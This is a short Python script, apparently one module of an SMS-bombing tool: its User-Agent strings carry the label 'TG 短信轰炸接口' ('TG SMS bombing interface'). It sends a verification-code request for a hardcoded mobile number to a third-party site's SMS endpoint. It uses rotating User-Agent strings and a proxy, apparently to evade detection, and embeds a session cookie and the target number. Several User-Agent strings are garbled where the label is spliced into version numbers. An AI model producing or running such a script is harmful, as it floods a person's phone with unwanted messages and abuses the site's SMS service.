import requests
import random

# 定义User-Agent列表
user_agents = [
    'Mozilla/5.0 (Linux; Android 10; ONEPLUS A3000 Build/QQ3A.200805.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/89.0.4389.105 Mobile Safari/537.36 uni-app Html5Plus/TG 短信轰炸接口.0 (Immersed/24.0)',
    # Android 用户代理
    'Mozilla/5.0 (Linux; Android 11; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.61 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 10; SM-G975F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.132 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 11; SM-A205U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Mobile Safari/537.36',

    # iOS 用户代理
    'Mozilla/5.0 (iPhone; CPU iPhone OS 14_4_2 like Mac OS X) AppleWebKit/605.TG 短信轰炸接口.15 (KHTML, like Gecko) Version/14.0.3 Mobile/15E148 Safari/604.TG 短信轰炸接口',
    'Mozilla/5.0 (iPad; CPU OS 14_4_2 like Mac OS X) AppleWebKit/605.TG 短信轰炸接口.15 (KHTML, like Gecko) Version/14.0.3 Mobile/15E148 Safari/604.TG 短信轰炸接口',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 13_3_1 like Mac OS X) AppleWebKit/605.TG 短信轰炸接口.15 (KHTML, like Gecko) Version/13.0.5 Mobile/15E148 Safari/604.TG 短信轰炸接口',

    'Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.TG 短信轰炸接口.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.TG 短信轰炸接口'
]

# 随机选择一个User-Agent
user_agent = random.choice(user_agents)

# Define the URL and headers
url = 'http://147.92.34.84:32313/api/v1/sms/getCode'
headers = {
    'Host': '147.92.34.84:32313',
    'Connection': 'keep-alive',
    'Content-Length': '73',
    'Accept': 'application/json, text/javascript, */*; q=0.01',
    'X-Requested-With': 'XMLHttpRequest',
    'User-Agent': user_agent,
    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
    'Origin': 'http://147.92.34.84:32313',
    'Referer': 'http://147.92.34.84:32313/h5/index/home/sms.html',
    'Accept-Encoding': 'gzip, deflate, br',
    'Accept-Language': 'zh,en-US;q=0.9,en;q=0.8',
    'Cookie': 'PHPSESSID=c60b713f01fa9cfb41c3f6792fe35617'
}

# Define the data to be sent
data = {
    'mobile': '15763540934',
    'type': '3',
    'encrypt_string': 'aaab4cbd1e869eecd5eb4841db0f8859'
}

# Define the proxy
proxies = {
    'http': 'http://127.0.0.1:7890',
    'https': 'http://127.0.0.1:7890'
}

# Send the POST request with proxy
response = requests.post(url, headers=headers, data=data, proxies=proxies)

# Print the response
print(response.status_code)
print(response.text)
